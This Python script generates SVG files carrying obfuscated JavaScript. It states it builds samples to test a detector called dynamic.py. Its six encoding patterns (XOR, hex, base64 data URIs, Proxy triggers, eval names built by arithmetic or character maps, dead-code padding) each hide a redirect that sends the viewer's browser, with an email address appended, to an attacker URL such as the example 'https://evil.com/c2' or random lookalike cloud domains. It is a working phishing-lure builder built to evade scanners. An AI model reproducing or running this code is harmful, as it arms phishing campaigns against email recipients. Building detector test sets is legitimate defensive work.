#!/usr/bin/env python3
"""
Enhanced SVG Obfuscation Encoder
Generates malicious SVG files with MORE dynamic variability for testing dynamic.py detection
"""

import argparse
import base64
import random
import string
import secrets
import hashlib
from pathlib import Path
from typing import List, Tuple, Optional


def random_var_name(length: int = None, style: str = None) -> str:
    """Generate random variable name with various styles"""
    if length is None:
        length = random.randint(1, 8)
    
    if style is None:
        style = random.choice(['mixed', 'underscore', 'camel', 'single', 'numeric'])
    
    if style == 'mixed':
        # Mix of upper/lower case
        return ''.join(random.choices(string.ascii_letters, k=length))
    elif style == 'underscore':
        # Underscore prefix with letters/numbers
        return '_' + ''.join(random.choices(string.ascii_letters + string.digits, k=length-1))
    elif style == 'camel':
        # camelCase style
        parts = [''.join(random.choices(string.ascii_lowercase, k=random.randint(2,4))) 
                for _ in range(random.randint(2,3))]
        return parts[0] + ''.join(p.capitalize() for p in parts[1:])
    elif style == 'single':
        # Single letter (common in obfuscated code)
        return random.choice(string.ascii_letters)
    else:  # numeric
        # Letter followed by numbers
        return random.choice(string.ascii_letters) + ''.join(random.choices(string.digits, k=random.randint(1,3)))


def random_whitespace() -> str:
    """Generate random whitespace for formatting variation"""
    return random.choice(['', ' ', '  ', '\n', '\t', ' \n '])


def random_string_quote() -> str:
    """Randomly choose quote style"""
    return random.choice(['"', "'", '`'])


def random_comment() -> str:
    """Generate random JavaScript comments for noise"""
    comments = [
        '',
        '// ' + ''.join(random.choices(string.ascii_letters, k=random.randint(5,15))),
        '/* ' + ''.join(random.choices(string.ascii_letters, k=random.randint(5,15))) + ' */',
    ]
    return random.choice(comments) + '\n' if random.random() > 0.7 else ''


def obfuscate_string_concat(s: str, var_prefix: str = None) -> Tuple[str, str]:
    """Break string into concatenated parts with various styles"""
    if var_prefix is None:
        var_prefix = random_var_name(style='single')
    
    # Choose concatenation style
    styles = ['plus', 'array_join', 'template', 'charcode', 'mixed']
    style = random.choice(styles)
    
    if style == 'plus':
        # Simple concatenation with +
        parts = []
        chunk_size = random.randint(2, 8)
        for i in range(0, len(s), chunk_size):
            quote = random_string_quote()
            parts.append(f"{quote}{s[i:i+chunk_size]}{quote}")
        return f"({'+'.join(parts)})", var_prefix
    
    elif style == 'array_join':
        # Array join method
        parts = []
        chunk_size = random.randint(1, 6)
        for i in range(0, len(s), chunk_size):
            quote = random_string_quote()
            parts.append(f"{quote}{s[i:i+chunk_size]}{quote}")
        sep = random.choice(['', ' ', ','])
        return f"([{','.join(parts)}].join('{sep}'))", var_prefix
    
    elif style == 'charcode':
        # Character codes with fromCharCode
        codes = [str(ord(c)) for c in s[:min(len(s), 10)]]  # Limit for performance
        remaining = s[min(len(s), 10):]
        if remaining:
            quote = random_string_quote()
            return f"(String.fromCharCode({','.join(codes)}) + {quote}{remaining}{quote})", var_prefix
        return f"String.fromCharCode({','.join(codes)})", var_prefix
    
    else:  # mixed or template
        # Mix of methods
        return f'"{s}"', var_prefix


def generate_random_subdomain(length: int = None) -> str:
    """Generate more varied random subdomains"""
    if length is None:
        length = random.randint(1, 3)
    
    patterns = [
        lambda: f"{''.join(random.choices(string.ascii_lowercase, k=random.randint(3,8)))}",
        lambda: f"{random.choice(['test', 'dev', 'prod', 'stage'])}{random.randint(1,999)}",
        lambda: f"{''.join(random.choices(string.ascii_lowercase, k=3))}-{''.join(random.choices(string.ascii_lowercase, k=4))}",
        lambda: f"{random.choice(['api', 'app', 'web', 'cdn'])}.{''.join(random.choices(string.ascii_lowercase, k=5))}",
        lambda: f"{''.join(random.choices(string.hexdigits.lower(), k=8))}"
    ]
    
    parts = [random.choice(patterns)() for _ in range(length)]
    return '.'.join(parts)


def generate_random_domain() -> str:
    """Generate varied malicious-looking domains"""
    tlds = ['com', 'net', 'org', 'ru']
    
    patterns = [
        lambda: f"{generate_random_subdomain()}.{random.choice(['cloudfront', 'amazonaws', 'azurewebsites', 'github', 'gitlab'])}.{random.choice(tlds)}",
        lambda: f"{''.join(random.choices(string.ascii_lowercase, k=random.randint(5,12)))}.{random.choice(tlds)}",
        lambda: f"{random.choice(['secure', 'auth', 'login', 'update'])}-{''.join(random.choices(string.ascii_lowercase, k=5))}.{random.choice(tlds)}",
        lambda: f"{''.join(random.choices(string.hexdigits.lower(), k=16))}.{random.choice(tlds)}"
    ]
    
    return random.choice(patterns)()


def generate_random_email() -> str:
    """Generate varied email addresses"""
    names = [
        lambda: f"{''.join(random.choices(string.ascii_lowercase, k=random.randint(3,8)))}@{generate_random_domain()}",
        lambda: f"{random.choice(['admin', 'user', 'test', 'info', 'support'])}@{generate_random_domain()}",
        lambda: f"{random.choice(['john', 'jane', 'bob', 'alice'])}.{random.choice(['smith', 'doe', 'wilson'])}@{generate_random_domain()}",
        lambda: f"{''.join(random.choices(string.ascii_lowercase, k=3))}{random.randint(100,999)}@{generate_random_domain()}"
    ]
    
    return random.choice(names)()


def add_dead_code() -> str:
    """Add random dead code for obfuscation"""
    if random.random() > 0.6:
        return ''
    
    patterns = [
        lambda: f"var {random_var_name()} = {random.randint(1,1000)};",
        lambda: f"if (false) {{ {random_var_name()}(); }}",
        lambda: f"try {{ }} catch({random_var_name()}) {{ }}",
        lambda: f"function {random_var_name()}() {{ return {random.randint(1,100)}; }}",
        lambda: f"var {random_var_name()} = [{','.join(str(random.randint(1,100)) for _ in range(random.randint(3,8)))}];",
    ]
    
    num_statements = random.randint(1, 3)
    return '\n'.join(random.choice(patterns)() for _ in range(num_statements)) + '\n'


def encode_pattern_2_hex_function(url: str, email: str) -> str:
    """Pattern 2: Hex-encoded dynamic execution with Function constructor"""
    email_var = random_var_name()
    hex_var = random_var_name()
    decoded_var = random_var_name()
    loop_var = random_var_name()
    temp_var = random_var_name()
    constructor_var = random_var_name()
    
    # Create the JavaScript payload
    payload = f'window.location.href = "{url}" + {email_var};'
    
    # Convert to hex
    hex_data = ''.join(f'{ord(c):02x}' for c in payload)
    
    svg_content = f'''<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg">
<script>
<![CDATA[
{random_comment()}
var {email_var} = "${email}";
var {hex_var} = "{hex_data}";
{add_dead_code()}
var {decoded_var} = "";
for (var {loop_var} = 0; {loop_var} < {hex_var}.length; {loop_var} += 2) {{
{random_whitespace()}var {temp_var} = parseInt({hex_var}.substr({loop_var}, 2), 16);
{random_whitespace()}{decoded_var} += String.fromCharCode({temp_var});
}}
{random_comment()}
var {constructor_var} = [].constructor.constructor;
{constructor_var}({decoded_var})();
{add_dead_code()}
]]>
</script>
</svg>'''
    return svg_content


def encode_pattern_3_object_keys(url: str, email: str) -> str:
    """Pattern 3: XOR + dynamic eval construction with object keys"""
    email_var = random_var_name()
    xor_data_var = random_var_name()
    xor_key_var = random_var_name()
    decoded_var = random_var_name()
    counter_var = random_var_name()
    loop_var = random_var_name()
    byte_var = random_var_name()
    global_var = random_var_name()
    obj_var = random_var_name()
    keys_var = random_var_name()
    eval_var = random_var_name()
    
    # Create the JavaScript payload
    payload = f'window.location.href = "{url}" + {email_var};'
    
    # Generate XOR key and encode
    xor_key = ''.join(random.choices('0123456789abcdef', k=24))
    xor_data = xor_encode(payload, xor_key)
    
    svg_content = f'''<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg">
<script>
<![CDATA[
{add_dead_code()}
var {email_var} = '${email}';
var {xor_data_var} = "{xor_data}";
var {xor_key_var} = "{xor_key}";
var {decoded_var} = "", {counter_var} = 0;
for (var {loop_var} = 0; {loop_var} < {xor_data_var}.length; {loop_var} += 2) {{
var {byte_var} = parseInt({xor_data_var}.slice({loop_var}, {loop_var} + 2), 16) ^ {xor_key_var}.charCodeAt({counter_var}++ % {xor_key_var}.length);
{decoded_var} += "%" + ("0" + {byte_var}.toString(16)).slice(-2);
}}
var {global_var} = (1, [].filter)['constructor']("return globalThis")();
{random_comment()}
var {obj_var} = {{e:1,v:2,a:3,l:4}};
var {keys_var} = Object.keys({obj_var}).sort().reverse().join('');
var {eval_var} = {keys_var}.replace(/(.)(.)(.)(.)/, "$3$1$4$2");
{global_var}[decodeURIComponent({eval_var})](decodeURIComponent({decoded_var}));
]]>
</script>
</svg>'''
    return svg_content


def encode_pattern_4_character_mapping(url: str, email: str) -> str:
    """Pattern 4: Character mapping with find() execution"""
    email_var = random_var_name()
    xor_data_var = random_var_name()
    xor_key_var = random_var_name()
    decoded_var = random_var_name()
    counter_var = random_var_name()
    loop_var = random_var_name()
    byte_var = random_var_name()
    char_map_var = random_var_name()
    func_var = random_var_name()
    eval_var = random_var_name()
    global_var = random_var_name()
    
    # Create the JavaScript payload
    payload = f'window.location.href = "{url}" + {email_var};'
    
    # Generate XOR key and encode
    xor_key = ''.join(random.choices('0123456789abcdef', k=24))
    xor_data = xor_encode(payload, xor_key)
    
    # Create character mapping for 'eval'
    chars = ['e', 'v', 'a', 'l', 'b', 'c', 'd', 'f', 'g', 'h', 'i', 'j', 'k', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u']
    char_map = {char: hex(ord(char)) for char in chars}
    
    svg_content = f'''<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg">
<script>
<![CDATA[
{add_dead_code()}
var {email_var} = '${email}';
var {xor_data_var} = "{xor_data}";
var {xor_key_var} = "{xor_key}";
var {decoded_var} = "", {counter_var} = 0;
for (var {loop_var} = 0; {loop_var} < {xor_data_var}.length; {loop_var} += 2) {{
var {byte_var} = parseInt({xor_data_var}[{loop_var}] + {xor_data_var}[{loop_var} + 1], 16);
{decoded_var} += String.fromCharCode({byte_var} ^ {xor_key_var}.charCodeAt({counter_var}++ % {xor_key_var}.length));
}}
var {char_map_var} = {{
{', '.join([f'"{k}": {v}' for k, v in char_map.items()])}
}};
var {func_var} = function({byte_var}) {{ return String.fromCharCode({char_map_var}[{byte_var}]); }};
var {eval_var} = {func_var}('e') + {func_var}('v') + {func_var}('a') + {func_var}('l');
var {global_var} = [].filter.constructor("return this")();
[0].find(function() {{ return ({global_var}[{eval_var}]({decoded_var}), 1); }});
{random_comment()}
]]>
</script>
</svg>'''
    return svg_content


def encode_pattern_5_arithmetic(url: str, email: str) -> str:
    """Pattern 5: Arithmetic character code evaluation"""
    email_var = random_var_name()
    xor_data_var = random_var_name()
    xor_key_var = random_var_name()
    decoded_var = random_var_name()
    counter_var = random_var_name()
    loop_var = random_var_name()
    byte_var = random_var_name()
    arith_var = random_var_name()
    eval_var = random_var_name()
    global_var = random_var_name()
    
    # Create the JavaScript payload
    payload = f'window.location.href = "{url}" + {email_var};'
    
    # Generate XOR key and encode
    xor_key = ''.join(random.choices('0123456789abcdef', k=24))
    xor_data = xor_encode(payload, xor_key)
    
    # Create arithmetic mapping for 'eval' (e=101, v=118, a=97, l=108)
    base_val = random.randint(80, 95)
    base_vals = {
        'base': base_val,
        'e_offset': 101 - base_val,  # e = 101
        'v_offset': 118 - base_val,  # v = 118  
        'a_offset': 97 - base_val,   # a = 97
        'l_offset': 108 - base_val   # l = 108
    }
    
    svg_content = f'''<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg">
<script>
<![CDATA[
var {email_var} = "${email}";
{add_dead_code()}
var {xor_data_var} = "{xor_data}";
var {xor_key_var} = "{xor_key}";
var {decoded_var} = "", {counter_var} = 0;
for (var {loop_var} = 0; {loop_var} < {xor_data_var}.length; {loop_var} += 2) {{
var {byte_var} = parseInt({xor_data_var}[{loop_var}] + {xor_data_var}[{loop_var} + 1], 16);
{decoded_var} += String.fromCharCode({byte_var} ^ {xor_key_var}.charCodeAt({counter_var}++ % {xor_key_var}.length));
}}
var {arith_var} = {{
{random_var_name()}: {base_vals['base']},
{random_var_name()}: {base_vals['e_offset']},
{random_var_name()}: {base_vals['v_offset']},
{random_var_name()}: {base_vals['a_offset']},
{random_var_name()}: {base_vals['l_offset']}
}};
var {eval_var} = String.fromCharCode(
{base_vals['base']} + {base_vals['e_offset']},
{base_vals['base']} + {base_vals['v_offset']},
{base_vals['base']} + {base_vals['a_offset']},
{base_vals['base']} + {base_vals['l_offset']}
);
var {global_var} = Function("return this")();
{global_var}[{eval_var}]({decoded_var});
{random_comment()}
]]>
</script>
</svg>'''
    return svg_content


def encode_pattern_6_data_uri(url: str, email: str) -> str:
    """Pattern 6: Data URI + base64 encoded script"""
    email_var = random_var_name()
    func_var = random_var_name()
    b64_var = random_var_name()
    constructor_var = random_var_name()
    
    # Create the inner script with multiple layers of encoding
    inner_script = f'''(function {func_var}() {{
    var {b64_var} = atob("{base64.b64encode(f'var {email_var} = "{email}"; window.location.href = "{url}" + {email_var};'.encode()).decode()}");
    var {constructor_var} = Function;
    {constructor_var}({b64_var})();
}})();'''
    
    # Encode as base64 data URI
    encoded_script = base64.b64encode(inner_script.encode()).decode()
    
    svg_content = f'''<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg">
<script src="data:application/javascript;base64,{encoded_script}"></script>
</svg>'''
    return svg_content


def encode_pattern_1_xor_proxy_enhanced(url: str, email: str) -> str:
    """Pattern 1: XOR + Proxy eval with Symbol.toPrimitive trigger"""
    email_var = random_var_name()
    xor_data_var = random_var_name()
    xor_key_var = random_var_name()
    decoded_var = random_var_name()
    eval_array_var = random_var_name()
    eval_var = random_var_name()
    proxy_var = random_var_name()
    global_var = random_var_name()
    counter_var = random_var_name()
    loop_var = random_var_name()
    
    # Create the JavaScript payload
    payload = f'window.location.href = "{url}" + {email_var};'
    
    # Generate XOR key and encode
    xor_key = ''.join(random.choices('0123456789abcdef', k=16))
    xor_data = xor_encode(payload, xor_key)
    
    svg_content = f'''<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg">
<script>
<![CDATA[
{add_dead_code()}
var {email_var} = "{email}";
var {xor_data_var} = "{xor_data}";
var {xor_key_var} = "{xor_key}";
{random_comment()}
var {decoded_var} = "", {counter_var} = 0;
for (var {loop_var} = 0; {loop_var} < {xor_data_var}.length; {loop_var} += 2) {{
var byte = parseInt({xor_data_var}[{loop_var}] + {xor_data_var}[{loop_var} + 1], 16) ^ {xor_key_var}.charCodeAt({counter_var}++ % {xor_key_var}.length);
{decoded_var} += String.fromCharCode(byte);
}}
{add_dead_code()}
var {eval_array_var} = ["e","v","a","l"];
var {eval_var} = {eval_array_var}.join("");
var {global_var} = Function("return this")();
{random_comment()}
var {proxy_var} = new Proxy({{}}, {{
get(target, prop) {{
if (prop === Symbol.toPrimitive) {{
return function() {{
return {global_var}[{eval_var}]({decoded_var});
}};
}}
}}
}});
{proxy_var} + "";
{add_dead_code()}
]]>
</script>
</svg>'''
    return svg_content



def xor_encode(data: str, key: str) -> str:
    """XOR encode with given key"""
    encoded = ""
    key_len = len(key)
    for i, char in enumerate(data):
        key_char = key[i % key_len]
        xor_result = ord(char) ^ ord(key_char)
        encoded += f"{xor_result:02x}"
    return encoded


def generate_svg(url: str, email: str, pattern: int) -> str:
    """Generate SVG with specified pattern"""
    
    patterns = {
        1: encode_pattern_1_xor_proxy_enhanced,
        2: encode_pattern_2_hex_function,
        3: encode_pattern_3_object_keys,
        4: encode_pattern_4_character_mapping,
        5: encode_pattern_5_arithmetic,
        6: encode_pattern_6_data_uri
    }
    
    if pattern not in patterns:
        raise ValueError(f"Unknown pattern: {pattern}")
    
    return patterns[pattern](url, email)


def main():
    parser = argparse.ArgumentParser(
        description="Enhanced obfuscated SVG generator with more dynamic variability",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Obfuscation Patterns:
  1  - XOR + Proxy eval with Symbol.toPrimitive
  2  - Hex-encoded dynamic execution
  3  - XOR + dynamic eval construction
  4  - Character mapping + find() execution
  5  - Arithmetic character code eval
  6  - Data URI + base64

Examples:
  python3 encoder.py -u "https://evil.com/c2" -p 1 -o xor_pattern.svg
  python3 encoder.py --random-all -o test_patterns/
        """)
    
    parser.add_argument("-u", "--url", help="Base URL to encode")
    parser.add_argument("-e", "--email", help="Email to append (default: random)")
    parser.add_argument("-p", "--pattern", type=int, choices=range(1, 7), 
                       help="Obfuscation pattern (1-6)")
    parser.add_argument("-o", "--output", help="Output file or directory")
    parser.add_argument("--random-all", action="store_true", 
                       help="Generate one SVG for each pattern")
    
    args = parser.parse_args()
    
    if args.random_all:
        # Generate all patterns
        output_dir = Path(args.output) if args.output else Path("test_patterns_enhanced")
        output_dir.mkdir(exist_ok=True)
        
        for pattern_num in range(1, 7):
            url = f"https://{generate_random_domain()}/malware"
            email = generate_random_email()
            svg_content = generate_svg(url, email, pattern_num)
            
            pattern_names = {
                1: "xor_proxy_enhanced",
                2: "hex_function",
                3: "object_keys",
                4: "character_mapping",
                5: "arithmetic",
                6: "data_uri"
            }
            
            filename = f"pattern_{pattern_num:02d}_{pattern_names[pattern_num]}.svg"
            output_path = output_dir / filename
            output_path.write_text(svg_content)
            print(f"Generated {pattern_names[pattern_num]}: {output_path}")
            print(f"  URL: {url}${email}\n")
    
    else:
        # Single generation
        if not args.url or not args.pattern:
            parser.error("--url and --pattern required unless using --random-all")
        
        email = args.email or generate_random_email()
        svg_content = generate_svg(args.url, email, args.pattern)
        
        if args.output:
            output_path = Path(args.output)
            output_path.write_text(svg_content)
            print(f"Generated: {output_path}")
        else:
            print(svg_content)
        
        print(f"URL: {args.url}${email}")


if __name__ == "__main__":
    main()